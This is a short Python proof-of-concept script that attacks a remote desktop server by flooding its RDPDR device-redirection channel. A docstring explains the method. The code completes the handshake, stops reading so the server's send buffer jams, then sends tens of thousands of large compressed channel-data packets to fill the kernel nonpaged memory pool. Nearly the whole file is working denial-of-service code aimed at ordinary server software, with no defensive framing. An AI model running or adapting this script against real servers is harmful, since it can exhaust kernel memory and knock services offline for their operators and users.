#!/usr/bin/env python
'''
PoC for filling kernel nonpaged over RDPDR channel.
The steps are
- complete RDP handshake and wait until server finish sending all data
- stop reading data from server and minimize receive buffer
- send valid requests to RDPDR channel
  - RDPDR channel sends response until send buffer is full
  - RDPDR is blocked on sending (timeout is 20 seconds. disconnect if timeout)
  - RDPDR channel cannot read/process channel data anymore
  - spam anydata to RDPDR channel (same as RDPSND)
'''
from myrdp import create_rdp, default_t120_channels
import random
import sys
import time
from struct import pack, unpack

host = sys.argv[1]

rdp = create_rdp(host, default_t120_channels, req_ssl=True, verbose=False)

rdpsnd_channel_id = rdp.channel_ids[1]
rdpdr_channel_id = rdp.channel_ids[3]
t120_channel_id = rdp.channel_ids[4]

print('connection established. recving data from server')

rdp.start_recv_loop()
rdp.wait_for_rdpdr_client_id()

print('sleep 1 second for receiving all server data')
time.sleep(1)

print('stop receiving')
rdp.stop_recv_and_minimize_buffer()
rdp.send_pkt_mouse_move(random.randint(1, 400), random.randint(1, 200))
# myrdp needs 1 response to stop reading
rdp.send_refresh_rect([pack('<HHHH', 480, 485, 525, 530)])
rdp.join_recv_thread()

print('make rdpdr channel write block')
pkt = rdp.create_rdpdr_announce_reply_packet()
rdp.send(pkt*64)

chdata = b'A'*8164

print('filling kernel nonpaged pool')
pkt = rdp.create_send_channel_data(rdpdr_channel_id, chdata, do_compress=True)
#print(len(pkt))
for i in range(900):
    rdp.send(pkt*100)

input("Press Enter to continue...\n")

rdp.disconnect()
